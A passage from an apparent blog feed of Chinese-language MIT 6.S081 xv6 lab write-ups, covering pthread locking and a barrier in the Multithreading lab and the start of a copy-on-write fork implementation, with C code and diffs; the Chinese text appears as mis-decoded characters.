 <span class="token comment">// unlock</span></code></pre><p><img src="/2024/08/13/MIT6.s081-2021-Lab%20Multithreading/lock1.png"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œkeys missing çš„é—®é¢˜å·²ç»è¢«è§£å†³ï¼Œä½†æ˜¯å¤§é”å¸¦æ¥çš„å°±æ˜¯æ›´ä½çš„æ€§èƒ½ï¼Œå®é™…ä¸Šæ ¹æ®ä¸Šå›¾å¯çŸ¥ï¼Œè¯¥å®ç°åœ¨åŒæ ¸æƒ…å†µä¸‹çš„è¿è¡Œé€Ÿåº¦ç”šè‡³æ…¢äºå•æ ¸ã€‚</p><p>å®é™…ä¸Šï¼Œå¯¹ <code>table</code> æ•°ç»„çš„éå†å¹¶ä¸ä¼šå¯¼è‡´ç«æ€ï¼Œå› æ­¤å°†åŠ é”çš„æ“ä½œå»¶è¿Ÿåˆ°éå†ç»“æŸåï¼š</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span>e <span class="token operator">=</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> e <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span> e <span class="token operator">=</span> e<span class="token operator">-></span>next<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token operator">-></span>key <span class="token operator">==</span> key<span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">pthread_mutex_lock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// lock</span><span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// update the existing key.</span>    e<span class="token operator">-></span>value <span class="token operator">=</span> value<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// the new is new.</span>    <span class="token function">insert</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> <span class="token operator">&amp;</span>table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">pthread_mutex_unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// unlock</span></code></pre><p><img src="/2024/08/13/MIT6.s081-2021-Lab%20Multithreading/lock2.png"></p><p>åšäº†ä¸Šè¿°ä¿®æ”¹åï¼Œä»ç„¶æ²¡æœ‰å‡ºç° key missing çš„æƒ…å†µï¼ŒåŒæ—¶æ•ˆç‡æå‡äº†ä¸€å€ä»¥ä¸Šã€‚</p><p>æœ€åï¼Œæ›´ç»†åŒ–ä¸€äº›ï¼Œåªæœ‰å½“ä¸¤ä¸ª <code>put()</code> æ˜ å°„åˆ°åŒä¸€ä¸ªæ¡¶æ—¶æ‰ä¼šå‘ç”Ÿç«æ€ï¼Œå› æ­¤å¯ä»¥ä¸ºæ¯ä¸ªæ¡¶åˆ†åˆ«è®¾ç½®ä¸€æŠŠé”ï¼Œä»¥è¿›ä¸€æ­¥æé«˜å¹¶å‘æ€§ï¼š</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span>e <span class="token operator">=</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> e <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span> e <span class="token operator">=</span> e<span class="token operator">-></span>next<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token operator">-></span>key <span class="token operator">==</span> key<span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">pthread_mutex_lock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>locks<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// lock</span><span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// update the existing key.</span>    e<span class="token operator">-></span>value <span class="token operator">=</span> value<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// the new is new.</span>    <span class="token function">insert</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> <span class="token operator">&amp;</span>table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">pthread_mutex_unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>locks<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// unlock</span></code></pre><p><img src="/2024/08/13/MIT6.s081-2021-Lab%20Multithreading/lock3.png"></p><p>å¯è§ï¼Œæ•ˆç‡åˆæœ‰è¿›ä¸€æ­¥æå‡ã€‚</p><h2 id="ä»£ç -1"><a href="#ä»£ç -1" class="headerlink" title="ä»£ç "></a>ä»£ç </h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/notxv6/ph.c b/notxv6/ph.cindex 82afe76..321e269 100644<span class="token coord">--- a/notxv6/ph.c</span><span class="token coord">+++ b/notxv6/ph.c</span>@@ -17,6 +17,7 @@ struct entry *table[NBUCKET];<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">int keys[NKEYS];</span><span class="token prefix unchanged"> </span><span class="token line">int nthread = 1;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">pthread_mutex_t locks[NBUCKET];</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">double</span><span class="token prefix unchanged"> </span><span class="token line">now()</span></span>@@ -47,6 +48,7 @@ void put(int key, int value)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    if (e->key == key)</span><span class="token prefix unchanged"> </span><span class="token line">      break;</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  pthread_mutex_lock(&amp;locks[i]);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  if(e)&#123;</span><span class="token prefix unchanged"> </span><span class="token line">    // update the existing key.</span><span class="token prefix unchanged"> </span><span class="token line">    e->value = value;</span></span>@@ -54,7 +56,7 @@ void put(int key, int value)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    // the new is new.</span><span class="token prefix unchanged"> </span><span class="token line">    insert(key, value, &amp;table[i], table[i]);</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  pthread_mutex_unlock(&amp;locks[i]);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">static struct entry*</span></span>@@ -118,6 +120,10 @@ main(int argc, char *argv[])<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    keys[i] = random();</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  for (int i = 0; i &lt; NBUCKET; ++i) &#123;</span><span class="token prefix inserted">+</span><span class="token line">    pthread_mutex_init(&amp;locks[i], NULL);</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  //</span><span class="token prefix unchanged"> </span><span class="token line">  // first the puts</span><span class="token prefix unchanged"> </span><span class="token line">  //</span></span></code></pre><h1 id="Barrier"><a href="#Barrier" class="headerlink" title="Barrier"></a>Barrier</h1><h2 id="æ€è·¯-2"><a href="#æ€è·¯-2" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>æœ€åä¸€ä¸ªå®éªŒä¸»è¦æ˜¯ç†Ÿæ‚‰ POSIX çº¿ç¨‹åº“ä¸­æ¡ä»¶å˜é‡ï¼ˆconditional variableï¼‰çš„ä½¿ç”¨ï¼Œå®ç°çš„æ€è·¯æ¯”è¾ƒç®€å•ï¼šå‰ nthread - 1 ä¸ªçº¿ç¨‹åœ¨æ¡ä»¶å˜é‡ä¸Šä¼‘çœ ï¼Œæœ€åä¸€ä¸ªçº¿ç¨‹å°†ä¼‘çœ çš„æ‰€æœ‰è¿›ç¨‹è¿›è¡Œå”¤é†’ã€‚æœ‰å…³æ¡ä»¶å˜é‡çš„ç”¨æ³•å¯ä»¥å‚è€ƒ OSTEPï¼š<a href="https://pages.cs.wisc.edu/~remzi/OSTEP/threads-cv.pdf">OSTEP: Condition Variables</a>.</p><h2 id="ä»£ç -2"><a href="#ä»£ç -2" class="headerlink" title="ä»£ç "></a>ä»£ç </h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/notxv6/barrier.c b/notxv6/barrier.cindex 12793e8..e4fd03e 100644<span class="token coord">--- a/notxv6/barrier.c</span><span class="token coord">+++ b/notxv6/barrier.c</span>@@ -30,7 +30,18 @@ barrier()<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  // Block until all threads have called barrier() and</span><span class="token prefix unchanged"> </span><span class="token line">  // then increment bstate.round.</span><span class="token prefix unchanged"> </span><span class="token line">  //  </span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  pthread_mutex_lock(&amp;bstate.barrier_mutex);</span><span class="token prefix inserted">+</span><span class="token line">  ++bstate.nthread;</span><span class="token prefix inserted">+</span><span class="token line">  if (bstate.nthread == nthread) &#123;</span><span class="token prefix inserted">+</span><span class="token line">    pthread_cond_broadcast(&amp;bstate.barrier_cond);</span><span class="token prefix inserted">+</span><span class="token line">++bstate.round;</span><span class="token prefix inserted">+</span><span class="token line">bstate.nthread = 0;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  else &#123;</span><span class="token prefix inserted">+</span><span class="token line">    pthread_cond_wait(&amp;bstate.barrier_cond, &amp;bstate.barrier_mutex);</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  pthread_mutex_unlock(&amp;bstate.barrier_mutex);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Uthread-switching-between-threads&quot;&gt;&lt;a href=&quot;#Uthread-switching-between-threads&quot; class=&quot;headerlink&quot; title=&quot;Uthread: switching between</summary>
      
    
    
    
    <category term="æ“ä½œç³»ç»Ÿ" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="ç»éªŒ" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="æ“ä½œç³»ç»Ÿ" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="xv6" scheme="http://lordaeronesz.github.io/tags/xv6/"/>
    
  </entry>
  
  <entry>
    <title>MIT6.s081 2021 Lab Copy on-write</title>
    <link href="http://lordaeronesz.github.io/2024/08/13/MIT6.s081-2021-Lab%20Copy%20on-write/"/>
    <id>http://lordaeronesz.github.io/2024/08/13/MIT6.s081-2021-Lab%20Copy%20on-write/</id>
    <published>2024-08-13T03:45:11.000Z</published>
    <updated>2024-08-13T10:01:33.110Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Implement-copy-on-write"><a href="#Implement-copy-on-write" class="headerlink" title="Implement copy-on write"></a>Implement copy-on write</h1><h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>xv6 ä½¿ç”¨ <code>fork()</code> ç³»ç»Ÿè°ƒç”¨åˆ›å»ºå­è¿›ç¨‹æ—¶ï¼Œéœ€è¦å°†çˆ¶è¿›ç¨‹çš„åœ°å€ç©ºé—´è¿›è¡Œ <strong>æ·±æ‹·è´</strong> ï¼Œå³å°†é¡µè¡¨å’Œå®é™…ç‰©ç†ç©ºé—´åŒæ—¶è¿›è¡Œæ‹·è´ï¼Œä»¥å®ç°çˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹åœ°å€ç©ºé—´çš„ç‹¬ç«‹æ€§ã€‚ä½†å¾ˆå¤šæ—¶å€™ï¼Œå¦‚ shell ç¨‹åºï¼Œ<code>fork()</code> é€šå¸¸ä¸ <code>exec()</code> æ­é…ä½¿ç”¨ï¼Œé¦–å…ˆä½¿ç”¨ <code>fork()</code> åˆ›å»ºå­è¿›ç¨‹ï¼Œéšååœ¨å­è¿›ç¨‹ä¸­ä½¿ç”¨ <code>exec()</code> å°†æŒ‡å®šçš„ç¨‹åºåŠ è½½åˆ°å½“å‰åœ°å€ç©ºé—´ï¼Œè¿™æ ·åœ¨ <code>fork()</code> ä¸­è¿›è¡Œçš„åœ°å€ç©ºé—´æ‹·è´å°±ç™½ç™½æµªè´¹äº†ã€‚</p><p>æœ¬å®ç°è¦æ±‚å®ç°ä¸€ä¸ªå†™æ—¶å¤åˆ¶ï¼ˆcopy-on writeï¼‰çš„ <code>fork()</code> ç³»ç»Ÿè°ƒç”¨ã€‚å…·ä½“æ¥è¯´ï¼Œåœ¨è¿›è¡Œè™šæ‹Ÿå†…å­˜æ‹·è´æ—¶ï¼Œä¸ç›´æ¥è¿›è¡Œç‰©ç†å†…å­˜çš„æ‹·è´ï¼Œåªæ˜¯å°†çˆ¶è¿›ç¨‹çš„é¡µè¡¨å¤åˆ¶ç»™å­è¿›ç¨‹ï¼Œè¿™æ ·å­è¿›ç¨‹å’Œçˆ¶è¿›ç¨‹çš„æ¯ä¸ªè™šæ‹Ÿé¡µé¢éƒ½æŒ‡å‘äº†åŒä¸€ä¸ªç‰©ç†é¡µé¢ï¼Œå½“å­è¿›ç¨‹éœ€è¦å¯¹æŸä¸ªè™šæ‹Ÿé¡µé¢è¿›è¡Œå†™å…¥æ—¶ï¼Œä¸ºäº†ä¿è¯çˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹ä¹‹é—´çš„ç‹¬ç«‹æ€§ï¼Œå­è¿›ç¨‹æ­¤æ—¶å°†è¿›è¡Œç‰©ç†å†…å­˜çš„åˆ†é…å’Œæ‹·è´ï¼Œå†è¿›è¡Œå†™å…¥ã€‚</p><h2 id="å®ç°æ–¹æ¡ˆ"><a href="#å®ç°æ–¹æ¡ˆ" class="headerlink" title="å®ç°æ–¹æ¡ˆ"></a>å®ç°æ–¹æ¡ˆ</h2><p>æ ¹æ®æç¤ºï¼Œå¯ä»¥å°†ä¸Šè¿°çš„å†™æ—¶å¤åˆ¶çš„æ€è·¯ç”¨ <strong>å¼‚å¸¸</strong> çš„æ–¹å¼æ¥å®ç°ã€‚</p><p>é¦–å…ˆå¯ä»¥åˆ©ç”¨é¡µè¡¨é¡¹çš„ flags ä¸­çš„ RSW ä½æ¥è¡¨ç¤ºé¡µè¡¨é¡¹æ˜¯å¦ä¸º COW é¡µï¼Œä»¥ä¾¿åç»­çš„å¼‚å¸¸å¤„ç†ã€‚</p><p>ä¿®æ”¹ <code>uvmcopy()</code> ï¼Œå°†ç‰©ç†é¡µé¢çš„åˆ†é…æ“ä½œå»é™¤ï¼Œåªæ˜¯è¿›è¡Œé¡µè¡¨çš„æ‹·è´ï¼Œå¹¶å°†çˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹çš„å¯¹åº”é¡µè¡¨é¡¹çš„ PTE_W ç½® 0ï¼ˆä»¥ä¾¿åœ¨å¯¹ COW é¡µè¿›è¡Œå†™å…¥æ—¶é™·å…¥å†…æ ¸ï¼‰ã€PTE_COW ç½® 1ã€‚</p><p>ä¿®æ”¹ <code>usertrap()</code>ï¼Œå½“é™·å…¥å†…æ ¸æ—¶ï¼Œå†…æ ¸é€šè¿‡æŸ¥çœ‹ scause å¯„å­˜å™¨ï¼ˆè§ä¸‹å›¾ï¼‰ä»¥åŠé¡µè¡¨é¡¹çš„ PTE_W å’Œ PTE_COW ä½ï¼Œè¯†åˆ«åˆ°é™·å…¥åŸå› æ˜¯å‘ç”Ÿåœ¨ COW é¡µä¸Šçš„ store page faultï¼ˆå¯„å­˜å™¨å€¼ä¸º 15ï¼‰æ—¶ï¼Œè¿›è¡Œå¯¹åº”çš„å¼‚å¸¸å¤„ç†ï¼šä½¿ç”¨ <code>kalloc()</code> ä¸ºå…¶åˆ†é…ç‰©ç†é¡µé¢ï¼Œå¹¶å°†å…¶é¡µè¡¨é¡¹æŒ‡å‘çš„ç‰©ç†åœ°å€æ•°æ®æ‹·è´åˆ°æ–°åˆ†é…çš„ç‰©ç†åœ°å€ä¸‹ï¼Œå®ç°ç‰©ç†å†…å­˜çš„æ‹·è´ã€‚æ­¤æ—¶ç”±äºé¡µè¡¨æ˜ å°„å‘ç”Ÿäº†æ”¹å˜ï¼Œéœ€è¦æ’å…¥æ–°çš„é¡µè¡¨é¡¹ï¼Œå¹¶åˆ é™¤æ—§çš„é¡µè¡¨é¡¹ã€‚åœ¨å¤„ç†äº† COW å¼‚å¸¸ä¹‹åï¼Œè¯¥é¡µé¢å°†ä¸å†æ˜¯ä¸€ä¸ª COW é¡µï¼Œå› æ­¤éœ€è¦å°† PTE_W ç½® 1ã€PTE_COW ç½® 0ã€‚</p><p><img src="/2024/08/13/MIT6.s081-2021-Lab%20Copy%20on-write/pf.png"></p><p>ä¸ºäº†åç»­å®ç°çš„æ–¹ä¾¿ï¼Œå¯ä»¥å°† COW é¡µçš„åˆ¤æ–­å’Œ COW é¡µçš„å¼‚å¸¸å¤„ç†åˆ†åˆ«å°è£…ä¸ºä¸¤ä¸ªå‡½æ•°ï¼š</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">iscowpage</span><span class="token punctuation">(</span><span class="token class-name">pagetable_t</span> pgtbl<span class="token punctuation">,</span> uint64 va<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>va <span class="token operator">>=</span> MAXVA<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token class-name">pte_t</span> <span class="token operator">*</span>pte <span class="token operator">=</span> <span class="token function">walk</span><span class="token punctuation">(</span>pgtbl<span class="token punctuation">,</span> va<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pte <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>pte <span class="token operator">&amp;</span> PTE_V<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>pte <span class="token operator">&amp;</span> PTE_U<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">*</span>pte <span class="token operator">&amp;</span> PTE_COW<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">cowfault</span><span class="token punctuation">(</span><span class="token class-name">pagetable_t</span> pagetable<span class="token punctuation">,</span> uint64 va<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    uint64 va0 <span class="token operator">=</span> <span class="token function">PGROUNDDOWN</span><span class="token punctuation">(</span>va<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">pte_t</span><span class="token operator">*</span> pte<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>pte <span class="token operator">=</span> <span class="token function">walk</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> va0<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    uint64 flags <span class="token operator">=</span> <span class="token function">PTE_FLAGS</span><span class="token punctuation">(</span><span class="token operator">*</span>pte<span class="token punctuation">)</span><span class="token punctuation">;</span>    uint64 pa0 <span class="token operator">=</span> <span class="token function">PTE2PA</span><span class="token punctuation">(</span><span class="token operator">*</span>pte<span class="token punctuation">)</span><span class="token punctuation">;</span>    flags <span class="token operator">&amp;=</span> <span class="token punctuation">(</span><span class="token operator">~</span>PTE_COW<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// clear COW bit</span>    flags <span class="token operator">|=</span> PTE_W<span class="token punctuation">;</span>      <span class="token comment">// set write bit</span>    uint64 mem<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>mem <span class="token operator">=</span> <span class="token punctuation">(</span>uint64<span class="token punctuation">)</span><span class="token function">kalloc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token function">memmove</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>mem<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>pa0<span class="token punctuation">,</span> PGSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// remove old PTE</span>    <span class="token function">uvmunmap</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> va0<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// install new PTE</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mappages</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> va0<span class="token punctuation">,</span> PGSIZE<span class="token punctuation">,</span> mem<span class="token punctuation">,</span> flags<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">kfree</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>mem<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>æ­¤å¤–ï¼Œè¿˜éœ€è¦ä¸ºæ¯ä¸ªç‰©ç†é¡µé¢å¼•å…¥ <strong>å¼•ç”¨è®¡æ•°ï¼ˆreference countï¼‰</strong> ï¼Œé¡µé¢åˆ›å»ºæ—¶è®¡æ•°ä¸º 1ï¼Œæ¯æ¬¡æ·»åŠ æˆ–ç§»é™¤æŒ‡å‘è¯¥ç‰©ç†åœ°å€çš„é¡µè¡¨é¡¹éƒ½å¢åŠ æˆ–å‡å°‘å¼•ç”¨è®¡æ•°ï¼Œå½“å¼•ç”¨è®¡æ•°ä¸º 0 æ—¶é‡Šæ”¾è¯¥ç‰©ç†é¡µé¢ã€‚è¿™é‡Œæœ‰ä¸€ä¸ªå®ç°çš„æŠ€å·§ï¼šå°†å¼•ç”¨è®¡æ•°çš„å‡å°‘æ”¾åˆ° <code>kfree()</code> ä¸­ï¼Œåœ¨ <code>kfree()</code> ä¸­æ ¹æ®å¼•ç”¨è®¡æ•°çš„å¤§å°å†³å®šæ˜¯å¦é‡Šæ”¾ç‰©ç†é¡µé¢ã€‚</p><p>æœ€åï¼Œä¹Ÿæ˜¯å¾ˆå®¹æ˜“å¿½è§†çš„ä¸€ç‚¹ï¼Œä¿®æ”¹ <code>copyout()</code> ä»¥å®ç°å¯¹ COW é¡µçš„æ”¯æŒã€‚åˆšå¼€å§‹çœ‹åˆ°è¿™ä¸ªæç¤ºçš„æ—¶å€™æˆ‘å¾ˆç–‘æƒ‘ï¼Œå‰é¢çš„å·¥ä½œè²Œä¼¼å·²ç»è¶³å¤Ÿå®ç° COW äº†ï¼Œä¸ºä»€ä¹ˆè¿˜è¦ä¿®æ”¹ <code>copyout</code>ï¼ŸåŸæ¥ xv6 å¯¹ COW é¡µè¿›è¡Œå†™æ—¶å¤åˆ¶éƒ½æ˜¯åŸºäº store page faultï¼Œå³å½“å°è¯•å†™å…¥ä¸€ä¸ª PTE_W ä¸º 0 çš„é¡µé¢æ—¶è§¦å‘å¼‚å¸¸ï¼Œå¯¼è‡´é™·å…¥å†…æ ¸ï¼Œå†ç”±å†…æ ¸è¿›è¡Œ COW é¡µé¢çš„å¼‚å¸¸å¤„ç†ï¼Œå…¶ä¸­é™·å…¥å†…æ ¸çš„æ“ä½œæ˜¯ç”±ç¡¬ä»¶è‡ªåŠ¨æ¥å®Œæˆçš„ï¼Œå…·ä½“æ¥è¯´ï¼Œæ˜¯åœ¨è™šå®åœ°å€è½¬æ¢é˜¶æ®µç”± MMU æ¥å®Œæˆçš„ã€‚è€Œ <code>copyout()</code> æ˜¯è¿è¡Œåœ¨å†…æ ¸æ€ä¸‹çš„å‡½æ•°ï¼Œå…¶åœ°å€è½¬æ¢æ˜¯ç”±å†…æ ¸ä¸­çš„å‡½æ•° <code>walk()</code> æ¥å®ç°çš„ï¼Œå› è€Œä¸ä¼šè‡ªåŠ¨è§¦å‘å¼‚å¸¸å¹¶äº¤ç”±å¼‚å¸¸å¤„ç†ç¨‹åºæ¥å¤„ç†ï¼Œè€Œéœ€è¦æ‰‹åŠ¨æ¥å®Œæˆã€‚ç”±äºå‰é¢å·²ç»å°† COW é¡µçš„åˆ¤æ–­å’Œå¤„ç†å°è£…æˆäº†å‡½æ•°ï¼Œå› æ­¤å¯¹ <code>copyout()</code> çš„ä¿®æ”¹å¾ˆç®€å•ï¼š</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">iscowpage</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> va0<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">cowfault</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> va0<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/kernel/defs.h b/kernel/defs.hindex 3564db4..f5a9d8d 100644<span class="token coord">--- a/kernel/defs.h</span><span class="token coord">+++ b/kernel/defs.h</span>@@ -63,6 +63,7 @@ void            ramdiskrw(struct buf*);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">void*           kalloc(void);</span><span class="token prefix unchanged"> </span><span class="token line">void            kfree(void *);</span><span class="token prefix unchanged"> </span><span class="token line">void            kinit(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">void            incrfcount(void*);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// log.c</span><span class="token prefix unchanged"> </span><span class="token line">void            initlog(int, struct superblock*);</span></span>@@ -145,6 +146,8 @@ void            trapinit(void);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">void            trapinithart(void);</span><span class="token prefix unchanged"> </span><span class="token line">extern struct spinlock tickslock;</span><span class="token prefix unchanged"> </span><span class="token line">void            usertrapret(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">int             iscowpage(pagetable_t, uint64);</span><span class="token prefix inserted">+</span><span class="token line">int             cowfault(pagetable_t, uint64);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// uart.c</span><span class="token prefix unchanged"> </span><span class="token line">void            uartinit(void);</span></span>@@ -170,6 +173,7 @@ uint64          walkaddr(pagetable_t, uint64);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">int             copyout(pagetable_t, uint64, char *, 